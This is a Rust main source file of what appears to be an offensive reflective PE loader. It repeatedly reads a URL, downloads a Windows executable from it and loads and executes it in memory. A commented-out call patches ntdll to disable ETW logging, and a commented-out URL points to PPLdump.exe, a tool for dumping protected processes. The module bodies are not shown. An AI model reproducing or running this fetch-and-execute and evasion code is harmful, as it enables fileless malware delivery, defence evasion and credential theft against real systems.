use url::Url;

mod etw;
mod error;
mod fetch;
mod loader;
mod user_struct;

fn main(){
    println!("[>] Exe who?");
    //new_ntdll_patch_etw().expect("Patching not okie");
    loop {
        println!();
        let url_str = match fetch::fetch_url(){
            Ok(_res) => _res,
            Err(_e) => continue,
        };

        // Check if user wants to exit
        if url_str.clone().as_str().trim().eq_ignore_ascii_case("quit") || 
            url_str.clone().as_str().trim().eq_ignore_ascii_case("exit") {
                break;
            }

        // Check for empty input
        if url_str.clone().as_str().trim().is_empty() {
            continue;
        }
        // let url_str = String::from("https://github.com/D1rkMtr/test/raw/main/PPLdump.exe");

        println!("[i] Fetching: {}", url_str);
        let url: Url = match Url::parse(url_str.as_str()) {
            Ok(_u) => _u,
            Err(e) => {
                eprintln!("[-] Failed to parse URL string");
                eprintln!("[-] Error: {}", e);
                continue;
            }
        };

        // Fetch PE
        let pe_buf = match fetch::fetch_pe(url) {
            Ok(_v) => _v,
            Err(e) => {
                eprintln!("[!] Error occurred as: {}", e);
                continue;
            }
        };

        // Load PE
        match loader::load_pe(pe_buf){
            Ok(_) => {
                println!("[i] Execution Successful");
            },
            Err(e) => {
                eprintln!("[!] Error occured as: {}", e);
                continue;
            }
        }

    }

    println!("[i] Bye :D");
}